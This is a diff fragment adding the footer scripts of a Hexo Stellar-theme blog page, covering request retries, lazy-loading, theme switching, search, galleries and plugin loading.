+            resolve(data);
+          }).catch(err => {
+            clearTimeout(timeout);
+            console.warn('[request] 错误:', err);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject(err);
+            } else {
+              setTimeout(load, 1000);
+            }
+          });
+        };
+
+        load();
+      });
+    },
+    requestWithoutLoading: (url, options = {}, maxRetry = 2, timeout = 5000) => {
+      return new Promise((resolve, reject) => {
+        let retryCount = 0;
+
+        const tryRequest = () => {
+          let timedOut = false;
+          const timer = setTimeout(() => {
+            timedOut = true;
+            if (++retryCount > maxRetry) reject('timeout');
+            else tryRequest();
+          }, timeout);
+
+          fetch(url, options)
+            .then(resp => {
+              clearTimeout(timer);
+              if (!resp.ok) throw new Error('bad response');
+              resolve(resp);
+            })
+            .catch(err => {
+              clearTimeout(timer);
+              if (++retryCount > maxRetry) reject(err);
+              else setTimeout(tryRequest, 500);
+            });
+        };
+
+        tryRequest();
+      });
+    },
+    /********************** requestAnimationFrame ********************************/
+    // 1、requestAnimationFrame 会把每一帧中的所有 DOM 操作集中起来，在一次重绘或回流中就完成，并且重绘或回流的时间间隔紧紧跟随浏览器的刷新频率，一般来说，这个频率为每秒60帧。
+    // 2、在隐藏或不可见的元素中，requestAnimationFrame 将不会进行重绘或回流，这当然就意味着更少的的 cpu，gpu 和内存使用量。
+    requestAnimationFrame: (fn) => {
+      if (!window.requestAnimationFrame) {
+        window.requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame;
+      }
+      window.requestAnimationFrame(fn)
+    },
+    dark: {},
+  };
+
+  // utils.dark.mode 当前模式 dark or light
+  // utils.dark.toggle() 暗黑模式触发器
+  // utils.dark.push(callBack[,"callBackName"]) 传入触发器回调函数
+  utils.dark.method = {
+    toggle: new RunItem(),
+  };
+  utils.dark = Object.assign(utils.dark, {
+    push: utils.dark.method.toggle.push,
+  });
+</script>
+<script>
+  const sidebar = {
+    leftbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    rightbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('rightbar');
+        l_body.removeAttribute('leftbar');
+      }
+    },
+    dismiss: () => {
+      if (l_body) {
+        l_body.removeAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    toggleTOC: () => {
+      document.querySelector('#data-toc').classList.toggle('collapse');
+    }
+  }
+</script>
+<script type="text/javascript">
+  (() => {
+    const tagSwitchers = document.querySelectorAll('.tag-subtree.parent-tag > a > .tag-switcher-wrapper')
+    for (const tagSwitcher of tagSwitchers) {
+      tagSwitcher.addEventListener('click', (e) => {
+        const parent = e.target.closest('.tag-subtree.parent-tag')
+        parent.classList.toggle('expanded')
+        e.preventDefault()
+      })
+    }
+
+    // Get active tag from query string, then activate it.
+    const urlParams = new URLSearchParams(window.location.search)
+    const activeTag = urlParams.get('tag')
+    if (activeTag) {
+      let tag = document.querySelector(`.tag-subtree[data-tag="${activeTag}"]`)
+      if (tag) {
+        tag.querySelector('a').classList.add('active')
+        
+        while (tag) {
+          tag.classList.add('expanded')
+          tag = tag.parentElement.closest('.tag-subtree.parent-tag')
+        }
+      }
+    }
+  })()
+</script>
+
+<script async src="https://gcore.jsdelivr.net/npm/vanilla-lazyload@19.1/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazy",
+    callback_loaded: (el) => {
+      el.classList.add('loaded');
+      const wrapper = el.closest('.lazy-box');
+      const icon = wrapper?.querySelector('.lazy-icon');
+      if (icon) icon.remove();
+    }
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    window.lazyLoadInstance?.update();
+  });
+
+  window.wrapLazyloadImages = (container) => {
+    if (typeof container === 'string') {
+      container = document.querySelector(container);
+    }
+    if (!container) return;
+    
+    const images = container.querySelectorAll('img');
+    images.forEach((img) => {
+      if (img.classList.contains('lazy')) return;
+
+      const src = img.getAttribute('src');
+      if (!src) return;
+
+      const wrapper = document.createElement('div');
+      wrapper.className = 'lazy-box';
+
+      const newImg = img.cloneNode();
+      newImg.removeAttribute('src');
+      newImg.setAttribute('data-src', src);
+      newImg.classList.add('lazy');
+
+      const icon = document.createElement('div');
+      icon.className = 'lazy-icon';
+      if (def.loading) {
+        icon.style.backgroundImage = `url("${def.loading}")`;
+      }
+
+      wrapper.appendChild(newImg);
+      wrapper.appendChild(icon);
+
+      img.replaceWith(wrapper);
+    });
+
+    // 通知 LazyLoad 更新
+    if (window.lazyLoadInstance?.update) {
+      window.lazyLoadInstance.update();
+    }
+  }
+  
+</script>
+
+<!-- required -->
+<script src="/js/main.js?v=1.33.1" defer></script>
+
+<script type="text/javascript">
+  const applyTheme = (theme) => {
+    if (theme === 'auto') {
+      document.documentElement.removeAttribute('data-theme')
+    } else {
+      document.documentElement.setAttribute('data-theme', theme)
+    }
+
+    // applyThemeToGiscus(theme)
+  }
+
+  // FIXME: 这会导致无法使用 preferred_color_scheme 以外的主题
+  const applyThemeToGiscus = (theme) => {
+    // theme = theme === 'auto' ? 'preferred_color_scheme' : theme
+    const cmt = document.getElementById('giscus')
+    if (cmt) {
+      // This works before giscus load.
+      cmt.setAttribute('data-theme', theme)
+    }
+
+    const iframe = document.querySelector('#comments > section.giscus > iframe')
+    if (iframe) {
+      // This works after giscus loaded.
+      const src = iframe.src
+      const newSrc = src.replace(/theme=[\w]+/, `theme=${theme}`)
+      iframe.src = newSrc
+    }
+  }
+
+  const switchTheme = () => {
+    // light -> dark -> auto -> light -> ...
+    const currentTheme = document.documentElement.getAttribute('data-theme')
+    let newTheme;
+    switch (currentTheme) {
+      case 'light':
+        newTheme = 'dark'
+        break
+      case 'dark':
+        newTheme = 'auto'
+        break
+      default:
+        newTheme = 'light'
+    }
+    applyTheme(newTheme)
+    window.localStorage.setItem('Stellar.theme', newTheme)
+    utils.dark.mode = newTheme === 'auto' ? (window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light") : newTheme;
+    utils.dark.method.toggle.start();
+
+    const messages = {
+      light: `切换到浅色模式`,
+      dark: `切换到深色模式`,
+      auto: `切换到跟随系统配色`,
+    }
+    hud?.toast?.(messages[newTheme])
+  }
+
+  (() => {
+    // Apply user's preferred theme, if any.
+    const theme = window.localStorage.getItem('Stellar.theme')
+    if (theme !== null) {
+      applyTheme(theme)
+    } else {
+      utils.dark.mode = window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light";
+    }
+    utils.dark.method.toggle.start();
+  })()
+</script>
+
+
+<!-- optional -->
+
+
+
+<script defer>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"rating":{"js":"/js/services/rating.js","api":"https://star-vote.xaox.cc/api/rating"},"vote":{"js":"/js/services/vote.js","api":"https://star-vote.xaox.cc/api/vote"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"friends_and_posts":{"js":"/js/services/friends_and_posts.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"},"voice":{"js":"/js/plugins/voice.js"},"video":{"js":"/js/plugins/video.js"},"download-file":{"js":"/js/plugins/download-file.js"},"twikoo":{"js":"/js/services/twikoo_latest_comment.js"},"waline":{"js":"/js/services/waline_latest_comment.js"},"artalk":{"js":"/js/services/artalk_latest_comment.js"},"giscus":{"js":"/js/services/giscus_latest_comment.js"},"contributors":{"edit_this_page":{"_posts/":null,"wiki/stellar/":"https://github.com/xaoxuu/hexo-theme-stellar-docs/blob/main/"},"js":"/js/services/contributors.js"}}`));
+    for (let id of Object.keys(ctx.services)) {
+      const js = ctx.services[id].js;
+      if (id == 'siteinfo') {
+        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
+        if (ctx.cardlinks?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            setCardLink(ctx.cardlinks);
+          });
+        }
+      } else if (id == 'voice') {
+        ctx.voiceAudios = document.querySelectorAll('.voice>audio');
+        if (ctx.voiceAudios?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            createVoiceDom(ctx.voiceAudios);
+          });
+        }
+      } else if (id == 'video') {
+        ctx.videos = document.querySelectorAll('.video>video');
+        if (ctx.videos?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            videoEvents(ctx.videos);
+          });
+        }
+      } else if (id == 'download-file') {
+        ctx.files = document.querySelectorAll('.file');
+        if (ctx.files?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            downloadFileEvent(ctx.files);
+          });
+        }
+      } else {
+        const els = document.getElementsByClassName(`ds-${id}`);
+        if (els?.length > 0) {
+          utils.jq(() => {
+            if (id == 'timeline' || 'memos' || 'marked') {
+              utils.js(deps.marked).then(function () {
+                utils.js(js, { defer: true });
+              });
+            } else {
+              utils.js(js, { defer: true });
+            }
+          });
+        }
+      }
+    }
+
+    // chat iphone time
+    let phoneTimes = document.querySelectorAll('.chat .status-bar .time');
+
+    if (phoneTimes.length > 0) {
+      NowTime();
+      var date = new Date();
+      var sec = date.getSeconds();
+      var firstAdjustInterval = setInterval(firstAdjustTime, 1000 * (60 - sec));
+    }
+
+    function firstAdjustTime() {
+      NowTime();
+      clearInterval(firstAdjustInterval);
+      setInterval(NowTime, 1000 * 60);
+    }
+
+    function NowTime() {
+      for (let i = 0; i < phoneTimes.length; ++i) {
+        var timeSpan = phoneTimes[i];
+        var date = new Date();
+        var hour = date.getHours();
+        var min = date.getMinutes();
+        timeSpan.innerHTML = check(hour) + ":" + check(min);
+      }
+    };
+
+    function check(val) {
+      if (val < 10) {
+        return ("0" + val);
+      }
+      return (val);
+    }
+
+    // chat quote
+    const chat_quote_obverser = new IntersectionObserver((entries, observer) => {
+      entries.filter((entry) => { return entry.isIntersecting }).sort((a, b) => a.intersectionRect.y !== b.intersectionRect.y ? a.intersectionRect.y - b.intersectionRect.y : a.intersectionRect.x - b.intersectionRect.x).forEach((entry, index) => {
+          observer.unobserve(entry.target);
+          setTimeout(() => {
+            entry.target.classList.add('quote-blink');
+            setTimeout(() => {
+              entry.target.classList.remove('quote-blink');
+            }, 1000);
+          }, Math.max(100, 16) * (index + 1));
+        });
+    });
+
+    var chatQuotes = document.querySelectorAll(".chat .talk .quote");
+    chatQuotes.forEach((quote) => {
+      quote.addEventListener('click', function () {
+        var chatCellDom = document.getElementById("quote-" + quote.getAttribute("quotedCellTag"));
+        if (chatCellDom) {
+          var chatDiv = chatCellDom.parentElement;
+          var mid = chatDiv.clientHeight / 2;
+          var offsetTop = chatCellDom.offsetTop;
+          if (offsetTop > mid - chatCellDom.clientHeight / 2) {
+            chatDiv.scrollTo({
+              top: chatCellDom.offsetTop - mid + chatCellDom.clientHeight / 2,
+              behavior: "smooth"
+            });
+          } else {
+            chatDiv.scrollTo({
+              top: 0,
+              behavior: "smooth"
+            });
+          }
+          chat_quote_obverser.observe(chatCellDom);
+        }
+      });
+    });
+  });
+</script>
+
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.search = {
+      path: `/search.json`,
+    }
+    utils.js('/js/search/local-search.js', { defer: true });
+  });
+</script><script>
+  window.FPConfig = {
+    delay: 0,
+    ignoreKeywords: [],
+    maxRPS: 5,
+    hoverDelay: 25
+  };
+</script>
+<script defer src="https://gcore.jsdelivr.net/npm/flying-pages@2/flying-pages.min.js"></script><script>
+  ctx.fancybox = {
+    selector: `.timenode p>img`,
+    css: `https://gcore.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.css`,
+    js: `https://gcore.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.umd.js`
+  };
+  var selector = '[data-fancybox]:not(.error), .with-fancybox .atk-content img:not([atk-emoticon])';
+  if (ctx.fancybox.selector) {
+    selector += `, ${ctx.fancybox.selector}`
+  }
+  var needFancybox = document.querySelectorAll(selector).length !== 0;
+  if (!needFancybox) {
+    const memos = document.getElementsByClassName('ds-memos');
+    if (memos != undefined && memos.length > 0) {
+      needFancybox = true;
+    }
+    const fancybox = document.getElementsByClassName('with-fancybox');
+    if (fancybox != undefined && fancybox.length > 0) {
+      needFancybox = true;
+    }
+  }
+  if (needFancybox) {
+    utils.css(ctx.fancybox.css);
+    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
+      Fancybox.bind(selector, {
+        hideScrollbar: false,
+        Thumbs: {
+          autoStart: false,
+        },
+        caption: (fancybox, slide) => {
+          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
+        }
+      });
+    })
+  }
+</script>
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const swiper_api = document.getElementById('swiper-api');
+    if (swiper_api != undefined) {
+      utils.css(`https://unpkg.com/swiper@10.3/swiper-bundle.min.css`);
+      utils.js(`https://unpkg.com/swiper@10.3/swiper-bundle.min.js`, { defer: true }).then(function () {
+        const effect = swiper_api.getAttribute('effect') || '';
+        var swiper = new Swiper('.swiper#swiper-api', {
+          slidesPerView: 'auto',
+          spaceBetween: 8,
+          centeredSlides: true,
+          effect: effect,
+          rewind: true,
+          pagination: {
+            el: '.swiper-pagination',
+            clickable: true,
+          },
+          navigation: {
+            nextEl: '.swiper-button-next',
+            prevEl: '.swiper-button-prev',
+          },
+        });
+      })
+    }
+  });
+</script>
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    window.codeElements = document.querySelectorAll('.code');
+    if (window.codeElements.length > 0) {
+      ctx.copycode = {
+        default_text: `Copy`,
+        success_text: `Copied`,
+        toast: `复制成功`,
+      };
+      utils.js('/js/plugins/copycode.js');
+    }
+  });
+</script>
+
+
+<!-- inject -->
+
+</div></body></html>
